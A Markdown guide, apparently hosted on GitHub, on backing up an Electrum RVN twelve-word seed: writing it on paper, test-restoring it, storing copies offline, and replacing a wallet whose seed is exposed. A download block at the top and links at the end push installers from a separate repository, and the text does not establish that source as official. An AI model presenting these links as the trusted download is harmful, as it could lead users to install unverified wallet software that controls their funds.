![Electrum RVN](assets/banner-article.png)

# How to Back Up an Electrum RVN Seed

<!-- compact-download-block -->

<p align="center">Twelve words on paper, before the first coin</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Write the twelve words on paper, in order, before the wallet holds anything, and store that paper somewhere a fire and a burglar do not both reach. That is the entire backup. The wallet file is a convenience, the password is a lock, and the seed is the only thing that brings the funds back.

## What you are backing up

The seed is a standard BIP-39 phrase of twelve words generated on your machine from operating-system entropy. Every address and private key in the wallet is derived from it, which is why one piece of paper can restore everything and why losing it loses everything.

Two consequences that people discover too late:

**The order matters.** The last word carries a checksum, so a phrase with two words swapped is invalid, not merely different.

**Anyone holding the words holds the funds.** There is no second factor, no password prompt, no support call. A seed on a photographed page is a wallet in someone else's photo library.

## The procedure

1. **Create the wallet and stop at the seed screen.** Do not continue past it until the paper exists.
2. **Write the words by hand**, numbered, in order, on paper that will survive a decade in a drawer. Pencil fades; use pen.
3. **Check each word against the screen as you write.** A single transposed letter is a lost wallet.
4. **Confirm on the next screen.** The wallet asks you to re-enter the words; that step exists to catch exactly this error.
5. **Set the password** only after the paper is done, and never write the password on the same paper.
6. **Test the backup** by restoring it into a second wallet name and confirming the balance appears. Then delete the test wallet.

Step six is the one people skip, and it is the only step that proves the backup works. A phrase you have never restored is a hope.

## Storing it

| Method | Good | Bad |
| --- | --- | --- |
| Paper in a safe | cheap, simple, offline | fire, flood, one location |
| Two papers, two locations | survives one disaster | more copies to track |
| Stamped metal | fire and water resistant | cost, and it is still one location unless duplicated |
| Password manager | convenient | it is now on a networked device |
| Photo or cloud note | easy | a copy on someone else's server |
| Engraved on a device | durable | the device can fail or be stolen whole |

The rule that matters more than the material: **the seed never touches a networked device**. Not a note, not a screenshot, not an email to yourself, not a password manager. [Storing your Electrum RVN seed offline](https://github.com/electrum-source/passphrase-backup/blob/main/storing-your-electrum-rvn-seed-offline.md) goes through the options in detail.

## What a good backup is not

It is not the wallet file. The file is encrypted and lives on the same machine as the wallet, so it shares the machine's fate - [where Electrum RVN stores your wallet](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md).

It is not the password. A password protects one file; the seed restores the wallet anywhere, with a new password of your choosing.

It is not a screenshot in a chat with yourself. That is a copy on a server, and servers get breached.

## After you have backed up

**Add a second copy in a different location.** One paper in one house is one accident away from nothing.

**Re-test annually.** Restore once a year, check the balance, delete the test wallet. It costs ten minutes and it catches a paper that has faded.

**Update the backup if you create a new wallet.** Two wallets means two seeds, and the second is the one people forget to write down.

**Tell one trusted person where it is, not what it is.** A sealed envelope with instructions is better than a phrase spoken aloud.

## If you think the seed is exposed

Treat it as compromised and act in this order: create a new wallet with a new seed, move everything to it, confirm the move, then destroy the old paper. Do not reuse the old wallet "just to check". [Electrum RVN recovery without the seed](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-recovery-without-the-seed.md) is the page for the case where the seed is gone rather than exposed.

If only the password is lost, the seed still works - [forgot your Electrum RVN password?](https://github.com/electrum-source/passphrase-backup/blob/main/forgot-your-electrum-rvn-password.md) - which is exactly why the paper matters more than the password.

## The one-minute version

Write twelve words on paper. Number them. Check them. Restore once to prove it. Put a copy somewhere else. Never photograph them. That is the whole discipline, and it is the difference between a wallet and a story about a wallet.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [What data does Electrum RVN collect?](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-data-collection.md) covers the privacy side, and [restore a wallet from an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md) is the procedure you are rehearsing when you test the backup.

## FAQ

### Where does the seed come from?

The wallet generates twelve BIP-39 words locally from your operating system's entropy. It is not assigned by a server and not transmitted anywhere.

### Can I store the seed digitally?

You can, and you should not. Any digital copy sits on a device that can be compromised, backed up or synced. Paper or metal, offline, is the standard.

### How many copies should I make?

Two, in different locations, is the usual answer. More copies means more chances one is found; fewer means one accident ends the wallet.

### Do I need the seed if I have the wallet file?

Only if the file fails, is lost, or you forget the password. That is the case the seed exists for, so treat it as the primary backup rather than the spare.

### What if I lose one word?

A twelve-word phrase with a missing word is not restorable by the wallet - the checksum fails. There is no partial recovery, which is why the paper is checked word by word when written.

<!-- related-articles -->

## Related articles

- [Storing Your Electrum RVN Seed Offline](https://github.com/electrum-source/passphrase-backup/blob/main/storing-your-electrum-rvn-seed-offline.md)
- [Where Electrum RVN Stores Your Wallet File](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md)
- [Electrum RVN Recovery Without the Seed](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-recovery-without-the-seed.md)
- [Forgot Your Electrum RVN Password](https://github.com/electrum-source/passphrase-backup/blob/main/forgot-your-electrum-rvn-password.md)
